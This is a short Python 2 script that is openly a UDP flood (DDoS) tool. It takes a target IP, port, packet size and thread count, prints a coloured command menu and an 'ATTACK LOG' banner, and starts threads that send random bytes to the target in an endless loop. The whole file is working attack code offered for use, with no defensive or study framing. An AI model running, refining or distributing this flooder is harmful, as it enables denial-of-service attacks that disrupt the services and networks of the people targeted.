#!/usr/bin/python
import socket
import threading
import random
import sys

class gramps(threading.Thread):

     def __init__ (self, ip, port, psize):
         threading.Thread.__init__(self)
         self.ip = ip
         self.port = port
         self.psize = psize

     def run(self):
         print "\033[36mIP \033[31m|  \033[34m" + self.ip + "\033[31m > \033[36mPORT \033[34m" + str(self.port) + "\033[31m |  \033[32mThreads >\033[31m" + str(threads) + "\033[0m"
         sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
         bytes = random._urandom(self.psize)
         while True:
             sock.sendto(bytes,(self.ip, self.port))

if len(sys.argv) < 2:
     print ""
     print u"\u001b[0m    \u001b[41;1m   Command List   \u001b[0m"
     print ""
     print u"\u001b[0m     \u001b[1m  \u001b[0mPINGER:  \u001b[31mNOT ADDED\u001b[0m"
     print u"\u001b[0m     \u001b[1m  \u001b[0mPORT SCAN:  \u001b[31mNOT ADDED\u001b[0m"
     print u"\u001b[0m     \u001b[1m  \u001b[0mDDOS: \u001b[0m\u001b[44mIP\u001b[0m \u001b[0m\u001b[44mPORT\u001b[0m \u001b[0m\u001b[44mPACKETS(10-1000)\u001b[0m \u001b[0m\u001b[44mTHREADS (10-20)\u001b[0m\u001b[0m"
     print u"\u001b[0m"
     print u"\u001b[0m"
     print u"\u001b[0m"
     print ""
     sys.exit()

try:
     threads = sys.argv[4]
except NameError:
     threads = 20
except IndexError:
     threads = 20

try:
     if int(sys.argv[3]) > 0 and int(sys.argv[3]) <= 65500:
         psize = int(sys.argv[3])
         print ""
         print ""
         print u"\u001b[0m    \u001b[41;1m   ATTACK  LOG  \u001b[0m"
         print "-----------------------------------------------------"
     else:
         psize = 1024
except IndexError:
     psize = 1024


for host in range(int(threads)):
     try:
         port = sys.argv[2]
     except IndexError:
         port = random.randrange(1, 65535, 2)
     at = gramps(sys.argv[1], int(port), int(psize))
     at.start()
